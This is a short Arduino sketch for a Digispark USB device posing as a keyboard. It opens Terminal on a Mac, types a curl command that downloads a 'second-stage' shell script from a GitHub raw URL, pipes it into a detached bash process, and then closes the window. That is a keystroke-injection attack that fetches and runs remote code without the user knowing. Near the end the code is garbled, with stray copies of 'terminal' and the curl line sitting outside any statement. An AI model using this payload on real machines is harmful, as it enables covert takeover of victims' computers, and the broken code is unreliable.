#include "DigiKeyboard.h"

void setup()
{
  delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  delay(500);
  DigiKeyboard.sendKeyStroke(41); // KEY_ESC
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  delay(500);
  DigiKeyboard.print("terminal");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);
  DigiKeyboard.print("curl https://raw.githubusercontent.com/gianluca-venturini/papera/master/second-stage.sh | nohup /bin/bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);terminal
  curl https://raw.githubusercontent.com/gianluca-venturini/papera/master/second-stage.sh | nohup /bin/bash
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop()
{
  /*empty*/
}
